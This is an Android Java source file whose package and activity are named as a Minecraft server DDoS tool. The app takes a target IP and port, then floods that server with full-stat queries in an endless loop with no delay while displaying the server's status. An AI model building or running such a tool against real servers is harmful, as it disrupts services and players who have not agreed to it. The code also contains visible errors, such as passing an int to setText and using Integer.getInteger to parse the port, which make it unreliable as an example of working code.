package com.nao20010128nao.McServerDDoS;

import android.app.*;
import android.os.*;
import android.view.*;
import android.widget.*;
import android.preference.*;
import android.content.*;
import query.*;
import java.util.*;

public class MainActivity extends Activity
{
	SharedPreferences pref;
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState)
	{
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
		pref=PreferenceManager.getDefaultSharedPreferences(MainActivity.this);
		((EditText)findViewById(R.id.ip)).setText(pref.getString("ip",""));
		((EditText)findViewById(R.id.port)).setText(pref.getInt("port",25565));
		findViewById(R.id.start).setOnClickListener(new View.OnClickListener(){
			public void onClick(View v){
				String ip=((EditText)findViewById(R.id.ip)).getText().toString();
				int port=Integer.getInteger(((EditText)findViewById(R.id.port)).getText().toString(),25565);
				PreferenceManager.getDefaultSharedPreferences(MainActivity.this)
					.edit()
					.putString("ip",ip)
					.putInt("port",port)
					.commit();
				startActivity(new Intent(MainActivity.this,DDoS.class).putExtra("ip",ip).putExtra("port",port));
			}
		});
    }
	public static class DDoS extends Activity {
		Thread t;
		TextView motd,gamemode,mapname,onlines,max;
		ListView players;
		ArrayAdapter<String> adap;
		@Override
		protected void onCreate(Bundle savedInstanceState) {
			// TODO: Implement this method
			super.onCreate(savedInstanceState);
			setContentView(R.layout.ddos);
			motd=(TextView)findViewById(R.id.motd);
			gamemode=(TextView)findViewById(R.id.gamemode);
			mapname=(TextView)findViewById(R.id.mapName);
			onlines=(TextView)findViewById(R.id.onlines);
			max=(TextView)findViewById(R.id.max);
			players=(ListView)findViewById(R.id.players);
			players.setAdapter(adap=new ArrayAdapter<String>(this,android.R.layout.simple_list_item_1,new ArrayList<String>()));
			(t=new Thread(){
				public void run(){
					String ip=getIntent().getStringExtra("ip");
					int port=getIntent().getIntExtra("port",25565);
					MCQuery q=new MCQuery(ip,port);
					while(!Thread.interrupted()){
						QueryResponse resp=q.fullStat();
						update(resp);
					}
				}
			}).start();
		}
		public void update(final QueryResponse resp){
			runOnUiThread(new Runnable(){
				public void run(){
					adap.clear();
					adap.addAll(resp.getPlayerList());
					motd.setText(resp.getMOTD());
					gamemode.setText(resp.getGameMode());
					mapname.setText(resp.getMapName());
					onlines.setText(resp.getOnlinePlayers());
					max.setText(resp.getMaxPlayers());
				}
			});
		}
	}
}
